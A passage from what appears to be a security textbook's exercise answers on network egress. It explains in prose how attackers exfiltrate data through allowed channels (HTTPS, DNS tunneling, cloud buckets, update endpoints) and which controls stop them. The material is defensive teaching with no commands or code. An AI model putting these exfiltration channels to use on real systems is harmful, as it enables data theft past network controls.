outbound constrained? (6) **Establish a baseline and monitor for change** — a *new* listening
port or outbound destination is the signal. Deliverable: a table of listeners with
bind/reachability/owner/justification and a prioritized findings list.

### 3.20
An attacker exfiltrates through whatever egress the environment *does* allow, because "egress
is blocked" almost always means "blocked to unapproved destinations": (a) HTTPS on 443 to an
attacker-controlled server, indistinguishable from normal web traffic if 443-to-anywhere is
permitted; (b) DNS tunneling (Chapter 17) if DNS resolution is allowed, encoding data in
subdomain queries to an authoritative server they control; (c) posting to the attacker's own
S3/cloud bucket via the provider API if that API is reachable; (d) through an allowed
monitoring, package-registry, or update endpoint. What actually stops them: a **default-deny
egress allowlist of specific destinations** (VPC endpoints so "reach S3" means "reach *our*
buckets", Chapter 8), an **outbound proxy that inspects and allowlists** including SNI/host,
**DNS egress restricted** to controlled resolvers with query logging and volume anomaly
detection (Chapter 17/82), and **monitoring of egress volume and destinations** so that a
new destination or a data-shaped outflow raises an alert. No single control is sufficient;
the combination of allowlisting plus monitoring is what closes it.

---

*Next: Chapter 4 — Anatomy of a Request: Browser to Database, Every Layer Explained. We take
the sockets, files, and syscalls of Chapters 1–3 and follow one HTTPS request through DNS,
TCP, TLS, HTTP, Nginx, Kestrel, and PostgreSQL, naming the security control available at
every single layer. This chapter is the map that the rest of the book fills in.*
